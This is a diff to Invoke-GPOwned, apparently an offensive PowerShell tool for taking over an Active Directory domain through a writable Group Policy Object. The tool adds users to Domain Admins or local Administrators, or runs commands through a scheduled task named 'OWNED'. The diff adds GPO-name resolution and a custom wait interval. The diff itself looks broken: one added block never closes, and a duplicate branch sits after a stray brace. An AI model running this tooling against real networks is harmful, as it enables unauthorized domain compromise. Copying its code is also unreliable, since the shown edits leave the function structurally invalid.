@@ -4,7 +4,15 @@ function Invoke-GPOwned {
         [Parameter(Mandatory=$false)]
         [Alias("guid")]
         [string]$GPOGUID,
+
+        [Parameter(Mandatory=$false)]
+        [Alias("gpo")]
+        [string]$GPOName,
         
+        [Parameter(Mandatory=$false)]
+        [Alias("int")]
+        [string]$Interval,
+
         [Parameter(Mandatory=$false)]
         [Alias("xml")]
         [string]$ScheduledTasksXMLPath,
@@ -63,7 +71,7 @@ function Invoke-GPOwned {
     )
 
     # Display help message if Help switch is used or required parameters are missing
-    if ($Help -or !($GPOGUID) -or !($ScheduledTasksXMLPath) -or !($Computer)) {
+    if ($Help -or (!$GPOGUID -and !$GPOName) -or !($ScheduledTasksXMLPath) -or !($Computer)) {
         Write-Output @"
 Invoke-GPOwned Help:
 
@@ -147,6 +155,18 @@ Parameters:
         $dc = (Get-ADDomain).InfrastructureMaster
     }
 
+    if ($GPOName) {
+        try {
+            $GPOGUID = (Get-ADObject -Filter "objectClass -eq 'groupPolicyContainer' -and displayName -eq '$GPOName'" -Properties DisplayName -ErrorAction Stop).Name
+            if (!$GPOGUID) {
+                throw "GPO not found"
+            }
+            $green+" Resolved GPO '$GPOName' to GUID: $GPOGUID"
+        }
+        catch {
+            $red+" Failed to find GPO with name: $GPOName"
+            return
+        }
     $gpoPath = "CN=$GPOGUID,CN=Policies,CN=System,DC=yourdomain,DC=com"
     $checkgpo = (Get-Acl -Path "AD:$gpoPath" 2>&1>$null).Access |
     Where-Object {
@@ -155,7 +175,7 @@ Parameters:
     }
 
     if($null -eq $checkgpo){
-        $red+" GPO not found or you don't have permissions to modify it!"
+        $red+" You don't have permissions to modify this GPO!"
         return
     }
 
@@ -492,36 +512,101 @@ Parameters:
 
     # A bad loading screen counting up to 300(5 minute update interval on DCs)
     if($DA){
-        for ($x = 1; $x -le 300; $x+=5 ){
-            $PercentCompleted = ($x/300*100)
-            Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
-            Start-Sleep -Seconds 10
-            if ((Get-ADGroupMember "Domain Admins" | Where-Object {$_.SamAccountName -eq "$User"})) {
-                break
+        if($Interval){
+            $totalSeconds = $Interval * 60
+            for ($x = 1; $x -le $totalSeconds; $x+=5 ){
+                $PercentCompleted = ($x/$totalSeconds*100)
+                Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
+                Start-Sleep -Seconds 10
+                if ((Get-ADGroupMember "Domain Admins" | Where-Object {$_.SamAccountName -eq "$User"})) {
+                    break
+                }
+            }
+        } else {
+            for ($x = 1; $x -le 300; $x+=5 ){
+                $PercentCompleted = ($x/300*100)
+                Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
+                Start-Sleep -Seconds 10
+                if ((Get-ADGroupMember "Domain Admins" | Where-Object {$_.SamAccountName -eq "$User"})) {
+                    break
+                }
             }
         }
         $green+" User added to the domain admins group!"
     } elseif($Local){
-         for ($x = 1; $x -le 300; $x+=10 ){
-            $PercentCompleted = ($x/300*100)
-            Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
-            Start-Sleep -Seconds 10
-            if ((Get-CimInstance -ClassName Win32_Group  -Filter 'SID = "S-1-5-32-544"' -ComputerName $Computer -ErrorAction SilentlyContinue | Get-CimAssociatedInstance -ResultClassName Win32_UserAccount | Select-Object -ExpandProperty Name | Where-Object {$_ -like "*$User*"})) {
-                break
-            }}
-        $green+" User added to the local admins group!"
-    }elseif($CMD -or $PowerShell){
-        for ($x = 1; $x -le 300; $x+=10){
-            $PercentCompleted = ($x/300*100)
-            Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
-            Start-Sleep -Seconds 10
-            try {
-                if (Get-ScheduledTask -TaskName OWNED -CimSession $dc) {
-                    $green+" Command executed successfully!"    
+        if($Interval){
+            $totalSeconds = $Interval * 60
+            for ($x = 1; $x -le $totalSeconds; $x+=10 ){
+                $PercentCompleted = ($x/$totalSeconds*100)
+                Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
+                Start-Sleep -Seconds 10
+                if ((Get-CimInstance -ClassName Win32_Group  -Filter 'SID = "S-1-5-32-544"' -ComputerName $Computer -ErrorAction SilentlyContinue | Get-CimAssociatedInstance -ResultClassName Win32_UserAccount | Select-Object -ExpandProperty Name | Where-Object {$_ -like "*$User*"})) {
                     break
                 }
-            } catch {}
+            }
+        } else {
+            for ($x = 1; $x -le 300; $x+=10 ){
+                $PercentCompleted = ($x/300*100)
+                Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
+                Start-Sleep -Seconds 10
+                if ((Get-CimInstance -ClassName Win32_Group  -Filter 'SID = "S-1-5-32-544"' -ComputerName $Computer -ErrorAction SilentlyContinue | Get-CimAssociatedInstance -ResultClassName Win32_UserAccount | Select-Object -ExpandProperty Name | Where-Object {$_ -like "*$User*"})) {
+                    break
+                }
+            }
         }
+        $green+" User added to the local admins group!"
+    }elseif($CMD -or $PowerShell){
+        if($Interval){
+            $totalSeconds = $Interval * 60
+            for ($x = 1; $x -le $totalSeconds; $x+=10){
+                $PercentCompleted = ($x/$totalSeconds*100)
+                Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
+                Start-Sleep -Seconds 10
+                try {
+                    if (Get-ScheduledTask -TaskName OWNED -CimSession $dc) {
+                        $green+" Command executed successfully!"    
+                        break
+                    }
+                } catch {}
+            }
+        } else {
+            for ($x = 1; $x -le 300; $x+=10){
+                $PercentCompleted = ($x/300*100)
+                Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
+                Start-Sleep -Seconds 10
+                try {
+                    if (Get-ScheduledTask -TaskName OWNED -CimSession $dc) {
+                        $green+" Command executed successfully!"    
+                        break
+                    }
+                } catch {}
+            }
+        }
+    }elseif($SecondTaskXMLPath){
+        if(!$User){
+            $User = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[-1]
+        }
+        if($Interval){
+            $totalSeconds = $Interval * 60
+            for ($x = 1; $x -le $totalSeconds; $x+=60){
+                $PercentCompleted = ($x/$totalSeconds*100)
+                Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
+                Start-Sleep -Seconds 10
+                if ((Get-ADGroupMember "Domain Admins" | Where-Object {$_.SamAccountName -eq "$User"})) {
+                    break
+                }          
+            }   
+        } else {
+            for ($x = 1; $x -le 86400; $x+=60){
+                $PercentCompleted = ($x/86400*100)
+                Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
+                Start-Sleep -Seconds 10
+                if ((Get-ADGroupMember "Domain Admins" | Where-Object {$_.SamAccountName -eq "$User"})) {
+                    break
+                }          
+            }   
+        }
+    }
     }elseif($SecondTaskXMLPath){
         if(!$User){
             $User = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[-1]
@@ -578,4 +663,3 @@ Parameters:
         Stop-Transcript
     }
 }
-
